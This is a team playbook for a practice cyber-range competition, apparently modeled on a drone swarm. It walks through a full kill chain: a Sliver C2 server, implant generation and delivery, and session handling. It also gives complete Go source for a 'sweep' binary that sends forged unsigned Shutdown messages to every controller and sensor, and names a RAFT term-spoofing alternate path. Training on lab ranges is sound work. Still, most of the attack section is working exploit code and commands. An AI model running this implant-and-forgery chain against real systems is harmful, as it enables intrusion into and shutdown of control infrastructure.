# GILDED GUARDIAN — TEAM GUIDE

**JTF Phoenix practice range, competition-accurate.**

This is the full start-to-finish guide for the team. Read it top to bottom before you SSH in.

---

## 0. Range Status (verified 2026-04-11)

| Component | Count | State |
|---|---|---|
| Controllers (RAFT cluster) | 5 | Up, leader elected |
| Sensors (track sources) | 6 | Up, clean DB |
| Boomers (strike assets) | 15 | Up, beaconing |
| Scenario engine | 1 | Up, 30s grace period |
| Scoreboard | 1 | Up, port 8080 |
| Attack station | 1 | Up, SSH on port 2222 |
| **Total** | **29** | **Pristine start** |

Mission duration: **240 minutes (4 hours)**. Max strikes before failure: **3**.

Target injection schedule (from `scenario/scenarios/standard.json`):

| Target | AT | Location | Description |
|---|---|---|---|
| TGT-FALLBROOK | T+30:00 | 34.04, -117.95 | Fallbrook coastal radar station |
| TGT-STELLAR-BAY | T+60:00 | 33.97, -118.03 | Stellar Bay SAM battery |
| TGT-AMBER-HEIGHTS | T+120:00 | 34.06, -118.07 | Amber Heights C2 node |
| TGT-M355-BRIDGE | T+180:00 | 34.00, -117.98 | M-355 GLOC bridge crossing |
| TGT-HARBOR-SOUTH | T+240:00 | 33.93, -118.01 | Southern harbor defense battery |

**You have 30 minutes from scenario start to kill the control plane before the first target injects.** If the control plane is down before T+30, no engage orders flow, and no target is ever intercepted.

---

## 1. Network Topology

```
Internet
   |
VPN overlay (WireGuard default, Tailscale optional)
   |
   |-- host:2222 (SSH) --> attack-station (172.21.0.100)
   |-- host:8080 (HTTP) --> scoreboard
   |
host
   |
   |-- docker network: attack-net (172.21.0.0/24)
   |      |-- attack-station    172.21.0.100  [only on this net]
   |      |-- boomer-1..15      172.21.0.101..115  [dual-homed]
   |
   |-- docker network: mantis-swarm (172.20.0.0/16)
          |-- controller-1..5   172.20.1.1..5
          |-- sensor-1..6       172.20.2.1..6
          |-- boomer-1..15      172.20.3.1..15
          |-- scenario engine   172.20.10.1
          |-- scoreboard        172.20.10.2
```

**Key network facts:**
- The attack station is **not** on `mantis-swarm`. You cannot `curl` controllers or sensors from the attack station.
- Boomers are **dual-homed** on both networks. They can reach the attack station (for beacon callback) AND they can reach controllers/sensors (for protocol traffic).
- **The only way to hit controllers/sensors is from inside a compromised boomer.** That means Sliver session → `upload` + `execute` on a boomer.

This is the same network isolation as the real competition.

---

## 2. Credentials

Two named team accounts on the attack station:

| User | Password | Purpose |
|---|---|---|
| `dash` | `<DEFAULT_PASSWORD>` | Person A (Sliver Operator) |
| `laura` | `<DEFAULT_PASSWORD>` | Person B (Support / Research) |

Plus a fallback `phoenix` account (same password) for a third person if needed.

> `<DEFAULT_PASSWORD>` is set by `scripts/entrypoint-attack.sh` (the
> default used during local practice is in that file). Operators **must**
> change it via `TEAM_PASS` in the attack-station environment before
> sharing a deployment with anyone outside the host's console. See
> [`SECURITY.md`](../SECURITY.md).

SSH uses **password authentication**. Key auth still works if you drop a public key into `./keys/dash.pub` on the host and recreate the container, but passwords are the primary path.

---

## 3. Team Roles — Two People, Two Jobs

### Person A — Sliver Operator (`dash`)
- Runs the Sliver server
- Generates the implant
- Starts the C2 HTTP listener
- Drives sessions: `sessions`, `use`, `upload`, `execute`

### Person B — Support / Research (`laura`)
- Serves `golden.exe` over HTTP on port 8443
- Pre-compiles the `sweep` binary before session-0
- Reads downloaded configs, maps the swarm
- Watches the scoreboard, calls out strike counter

**Do not have both people run `sliver-server`.** Only one at a time. If both try, kill whichever started second.

---

## 4. Connect to the Attack Station

Both people SSH in from their VPN-connected machine (WireGuard or Tailscale):

```bash
# Person A
ssh dash@<RANGE_ENDPOINT> -p 2222
# Password: <DEFAULT_PASSWORD>

# Person B (separate terminal, separate machine)
ssh laura@<RANGE_ENDPOINT> -p 2222
# Password: <DEFAULT_PASSWORD>
```

You will see:

```
=== GILDED GUARDIAN — ATTACK STATION ===
Your attack station is ready. Good luck.
```

No hints. No pre-installed tools aside from the basics.

**If you get an SSH host key warning** (you will if the container was rebuilt):

```bash
ssh-keygen -R "[<RANGE_ENDPOINT>]:2222"
```

Then re-connect.

---

## 5. Step-by-Step Playbook

### Step 0 (T-5:00) — Pre-flight

**Person A** opens a tmux session so you can share your screen later:

```bash
tmux new -s mission
```

**Person B** joins the same tmux if they want to watch Person A's work:

```bash
tmux attach -t mission
# Ctrl+B then " to split horizontally
# Ctrl+B then arrow keys to move between panes
```

Both open a separate **un-shared** terminal for their own work. Person A will work in the shared tmux; Person B will work in their own SSH session to run the HTTP file server and compile tools.

---

### Step 1 (T-4:00) — Start Sliver Server (Person A)

In Person A's terminal:

```bash
sliver-server
```

First boot takes 60–90 seconds. When you see the `[server] sliver >` prompt, you're ready.

**Do not type anything into Sliver yet** — Person B still needs to prep the file server.

---

### Step 2 (T-4:00, parallel) — Identify Your Attack-Net IP (Person B)

Person B finds the attack station's IP on the attack network:

```bash
hostname -i
# OR
ip -4 addr show dev eth0 | awk '/inet/ {print $2}'
```

You should see `172.21.0.100`. Note it — you'll use it to tell Sliver where to listen and where to call back.

---

### Step 3 (T-3:00) — Pre-compile the Sweep Binary (Person B)

This is the payload you're going to upload to the boomer. It POSTs a forged `Shutdown` message to every controller and every sensor. Because `verify_signatures: false` is the default vulnerability, you can sign it with garbage.

```bash
cd /tmp
cat > sweep.go <<'EOF'
package main

import (
    "bytes"
    "fmt"
    "net/http"
    "sync"
)

func main() {
    sd := []byte(`{"destination":"x","source":"x","msg":"","msg_type":"Shutdown","msg_sig":"","nonce":"n","authority":{"endorsements":[]}}`)

    var targets []string
    for i := 1; i <= 5; i++ {
        targets = append(targets, fmt.Sprintf("http://172.20.1.%d:10000/", i))
    }
    for i := 1; i <= 6; i++ {
        targets = append(targets, fmt.Sprintf("http://172.20.2.%d:10000/", i))
    }

    var wg sync.WaitGroup
    for _, u := range targets {
        wg.Add(1)
        go func(u string) {
            defer wg.Done()
            resp, err := http.Post(u, "application/json", bytes.NewReader(sd))
            if err != nil {
                fmt.Printf("ERR %s: %v\n", u, err)
                return
            }
            fmt.Printf("HIT %s: %d\n", u, resp.StatusCode)
            resp.Body.Close()
        }(u)
    }
    wg.Wait()
    fmt.Println("sweep complete")
}
EOF

CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o sweep sweep.go
ls -la /tmp/sweep
```

You should see a ~2 MB static binary. That's your kill payload.

---

### Step 4 (T-2:00) — Generate the Implant (Person A)

Inside Person A's Sliver console:

```
generate --http 172.21.0.100:8888 --os linux --arch amd64 --save /var/www/golden.exe --skip-symbols
```

Compile takes 1–2 minutes. When it prints `Implant saved to /var/www/golden.exe`, move on.

**Common mistake**: Typing `https://` or `http://` in the `--http` flag. Don't. Just `IP:PORT`. Sliver adds the scheme.

---

### Step 5 (T-1:00) — Start the C2 Listener (Person A)

Still in Sliver console:

```
http --lhost 172.21.0.100 --lport 8888
```

You should see:

```
[*] Starting HTTP :8888 listener ...
[*] Successfully started job #1
```

This is where the implants will call back.

---

### Step 6 (T-0:30) — Serve golden.exe (Person B)

In Person B's terminal:

```bash
cd /var/www && python3 -m http.server 8443
```

You should see:

```
Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ...
```

Within **5 seconds** you'll see GET requests from boomers start hitting this server:

```
172.21.0.101 - - [...] "GET /golden.exe HTTP/1.1" 200 -
172.21.0.102 - - [...] "GET /golden.exe HTTP/1.1" 200 -
...
172.21.0.115 - - [...] "GET /golden.exe HTTP/1.1" 200 -
```

All 15 boomers should download the implant within ~30 seconds.

---

### Step 7 (T+0:00) — Catch the Sessions (Person A)

Back in Sliver console, watch for session notifications:

```
[*] Session abc123 - 172.21.0.101:54321 (mantis-node) - linux/amd64
[*] Session def456 - 172.21.0.102:54322 (mantis-node) - linux/amd64
...
```

List them:

```
sessions
```

You should see 15 sessions (one per boomer). If fewer than 15 appear after 60 seconds, check:
1. Is `http --lhost 172.21.0.100 --lport 8888` still running in Sliver? (`jobs`)
2. Is `python3 -m http.server 8443` still running in Person B's terminal?
3. Are all 15 boomers still up? (ask team lead to check `docker ps`)

---

### Step 8 (T+1:00) — Enter One Session and Enumerate

Pick any session:

```
use <first-session-id>
```

You are now inside a boomer container. You have no shell, no curl, no Python. You have only what Sliver gives you: `ls`, `cat`, `download`, `upload`, `execute`, `ps`, `pwd`, `cd`.

```
ls /
ls /etc/mantis
download /etc/mantis/config.json /tmp/config.json
```

The config will download to `/tmp/config.json` on the attack station (Person A's side).

Person B reads it:

```bash
cat /tmp/config.json | python3 -m json.tool | less
```

**What to look for:**
- `iff`: starts with `3` → you're on a boomer
- `beacon.enabled: true` → confirms boomer
- `verify_signatures: false` → primary vulnerability
- `controllers: [5 entries]` → 172.20.1.1..5
- `sensors: [6 entries]` → 172.20.2.1..6
- `boomers: [14 other entries]` → 172.20.3.*
- `key_path: /etc/mantis/keys/private.pem` → Ed25519 (not needed, sigs are off)

---

### Step 9 (T+2:00) — Upload and Run the Sweep

Still in the Sliver session (any single boomer):

```
upload /tmp/sweep /tmp/sweep
execute -o /tmp/sweep
```

The sweep binary runs **inside the boomer's network namespace**, which means it has direct routing to 172.20.1.* (controllers) and 172.20.2.* (sensors) via the mantis-swarm bridge. You should see:

```
HIT http://172.20.1.1:10000/: 0
HIT http://172.20.1.2:10000/: 0
HIT http://172.20.1.3:10000/: 0
HIT http://172.20.1.4:10000/: 0
HIT http://172.20.1.5:10000/: 0
HIT http://172.20.2.1:10000/: 0
HIT http://172.20.2.2:10000/: 0
HIT http://172.20.2.3:10000/: 0
HIT http://172.20.2.4:10000/: 0
HIT http://172.20.2.5:10000/: 0
HIT http://172.20.2.6:10000/: 0
sweep complete
```

Status 0 means no response — **correct**, because the Shutdown handler calls `os.Exit(0)` before it can send a response. Each hit is a successful permanent kill.

---

### Step 10 (T+2:30) — Verify on the Scoreboard

In any browser:

```
http://<RANGE_ENDPOINT>:8080
```

You should see:
- 5 controllers: all **DARK**
- 6 sensors: all **DARK**
- 15 boomers: all **ALIVE** but idle (no engage orders incoming)
- Strike counter: **0 / 3**

**Why this wins**: boomers poll controllers for engage orders every 1 second. With all 5 controllers dead, they poll into void forever. They never receive a target. They fly nowhere. When the scenario engine injects TGT-FALLBROOK at T+30, it goes into sensor DBs — but the sensors are also dead, so the controllers never get a `Sensor:Track Update`, and nobody assigns a boomer to it.

---

### Step 11 (T+3:00 through T+240:00) — Insurance Loop

Don't trust your one-shot sweep. Re-run it every 2 minutes as insurance. In the same Sliver session:

```
execute -o /tmp/sweep
```

If a controller or sensor somehow came back (it shouldn't), it dies again within milliseconds.

Better: script it. Drop this on the attack station:

```bash
cat > /tmp/loop.sh <<'EOF'
#!/bin/bash
while true; do
  echo "[$(date +%H:%M:%S)] sweep"
  sleep 120
done
EOF
chmod +x /tmp/loop.sh
```

Then just re-run `execute -o /tmp/sweep` from Sliver every time you see a tick. Manual is fine for 4 hours; set a phone timer.

---

### Step 12 (T+30, T+60, T+120, T+180, T+240) — Watch Targets Inject and Fail

Every time a target drops:
- It appears on the scoreboard map
- No boomer moves toward it
- Strike counter stays at **0 / 3**

If at any point strike counter goes up:
1. Check if controllers/sensors came back (re-run sweep)
2. Check if any boomer was ALREADY in flight when the sweep fired (it'll complete its engage)
3. Worst case: you ate a strike, now you have 1/3 margin

**Win condition**: T+240:00 with strike counter **<3/3**.

---

## 6. Common Mistakes

| # | Mistake | Fix |
|---|---|---|
| 1 | Typing `https://` in Sliver's `--http` | Just `IP:PORT`. No scheme. |
| 2 | Forgetting to start the Sliver HTTP listener | `http --lhost 172.21.0.100 --lport 8888` before serving golden.exe |
| 3 | Forgetting to serve golden.exe | `cd /var/www && python3 -m http.server 8443` in a separate terminal |
| 4 | Running `sliver-server` as both users | Only one at a time. Whoever started first keeps it. |
| 5 | Using Sliver `kill` or `terminate -F` on a boomer | Produces non-zero exit → container restarts → boomer comes back. Use forged `Shutdown` messages, not Sliver kill. |
| 6 | Trying to `curl http://172.20.1.1` from the attack station | Attack station is not on `mantis-swarm`. You MUST execute from inside a boomer session. |
| 7 | Trying to POST Shutdown to a boomer | Boomers have no HTTP server. Port 10000 is only on controllers/sensors. |
| 8 | Not running a static binary | Boomers have no libc, no shell. Use `CGO_ENABLED=0` when compiling. |
| 9 | Waiting past T+30 to fire the sweep | First target injects at T+30:00. Fire earlier or eat strike #1. |
| 10 | SSH host key warning after a reset | `ssh-keygen -R "[<RANGE_ENDPOINT>]:2222"` then re-connect. |

---

## 7. How the Range Resets

**Auto-reset**: Every day at 12:00 PM MST. Full stack wipe and fresh start.

**Manual reset**: Only the team lead can reset the range mid-practice (requires host access — team accounts cannot escape to Docker even with the socket mounted, because of group permissions). If you need a fresh start mid-session, text the team lead.

**What survives a reset**:
- SSH user accounts and passwords (recreated by entrypoint on every start)
- The compose file + configs

**What gets wiped**:
- All sensor track databases (the permanent fix in `cmd/sensor/main.go` clears `DELETE FROM tracks` on startup)
- All in-memory state (RAFT term, track assignments, beacon callback flag)
- /tmp on every container (tmpfs)

---

## 8. Speedrun Timeline

For a polished run once you've practiced it a few times:

| Time | Person A | Person B |
|---|---|---|
| T-5:00 | SSH in, start tmux, `sliver-server` | SSH in, pre-compile `sweep.go`, `hostname -i` |
| T-3:00 | `generate --http 172.21.0.100:8888 --os linux --arch amd64 --save /var/www/golden.exe --skip-symbols` | Wait for generate to finish, tmux setup |
| T-1:30 | `http --lhost 172.21.0.100 --lport 8888` | `cd /var/www && python3 -m http.server 8443` |
| T+0:00 | First Sliver sessions appear | Watch beacon GETs in http.server log |
| T+0:30 | `use <id>` → on a boomer | Confirm scoreboard shows all 11 HTTP nodes green |
| T+1:00 | `upload /tmp/sweep /tmp/sweep` | Watch scoreboard |
| T+1:15 | `execute -o /tmp/sweep` → **control plane DEAD** | Scoreboard: all controllers+sensors go dark |
| T+1:30 | Strike counter: **0 / 3**, boomers idle | Confirm 0/3 and start the re-sweep timer |
| T+30:00 | First target drops — does nothing | Scoreboard: target on map, no interception |
| T+240:00 | **MISSION COMPLETE** | Celebrate |

The whole kill chain should take **under 2 minutes** once you've practiced it. The remaining 238 minutes are just the insurance loop.

---

## 9. If Something Goes Wrong

**No Sliver sessions appearing after 60 seconds**
1. Is `http --lhost 172.21.0.100 --lport 8888` still running? → `jobs` in Sliver
2. Is `python3 -m http.server 8443` still running? → check Person B's terminal
3. Are boomers beaconing? → ask team lead to `docker logs mantis-boomer-1 | tail`

**Sweep binary runs but controllers don't die**
1. Did you compile with `CGO_ENABLED=0`? → otherwise it won't run on musl alpine
2. Did you target the right IPs? → 172.20.1.1..5, not 172.21.x.x
3. Is `verify_signatures` actually `false`? → read the config to confirm

**Controller comes back after 5 seconds**
- Shouldn't happen. Exit code 0 + `restart: on-failure` = stay dead.
- If it does, something is non-standard. Ask team lead to run `docker inspect mantis-controller-1 --format '{{.HostConfig.RestartPolicy.Name}}'`. Should print `on-failure`. If it prints `always` or `unless-stopped`, the compose file got edited wrong.

**Strike counter increments**
- A boomer was already in flight when the sweep fired. The engage completes after the controller dies.
- Fix: fire the sweep earlier next time.

**Scoreboard shows wrong data**
- It uses the Docker API to poll container state. A 1-second refresh is normal. Allow up to 3 seconds for state to settle.

---

## 10. The Vulnerabilities You're Exploiting

This is what to understand conceptually. You don't need any of this for the speedrun, but it's what the briefing wants you to articulate.

| # | Vulnerability | How you use it |
|---|---|---|
| 1 | `verify_signatures: false` default | Forge any message with empty signature, empty nonce, garbage UUIDs |
| 2 | `Shutdown` → `os.Exit(0)` | Permanent kill with one POST |
| 3 | `restart: on-failure` skips exit 0 | Shutdown is the only kill that sticks; Sliver `kill` does not |
| 4 | Boomers have no HTTP server | You can't Shutdown a boomer directly; you starve it by killing controllers |
| 5 | Beacon callback @ 450km | Your landing path — boomers come to you |
| 6 | RAFT higher-term-wins | Alt path: spoof term=999999 to all controllers to paralyze elections (you don't need this for the speedrun but it's the fallback if Shutdown is somehow patched) |
| 7 | 0777 comms Unix socket | Local on a controller. Not reachable from a boomer. Alt-path only if team ever lands on a controller. |

---

## 11. URLs & Addresses Reference Card

| What | Where |
|---|---|
| Scoreboard | http://<RANGE_ENDPOINT>:8080 |
| SSH to attack station | `ssh dash@<RANGE_ENDPOINT> -p 2222` (password `<DEFAULT_PASSWORD>`) |
| Attack station IP (attack-net) | 172.21.0.100 |
| Sliver C2 listener | 172.21.0.100:8888 |
| Golden.exe HTTP server | 172.21.0.100:8443 |
| Controllers (from inside a boomer) | 172.20.1.1 through 172.20.1.5, port 10000 |
| Sensors (from inside a boomer) | 172.20.2.1 through 172.20.2.6, port 10000 |
| Boomers (for reference) | 172.20.3.1 through 172.20.3.15 — NO HTTP server |

---

Good hunting. Leave the AO Rizzo safe.
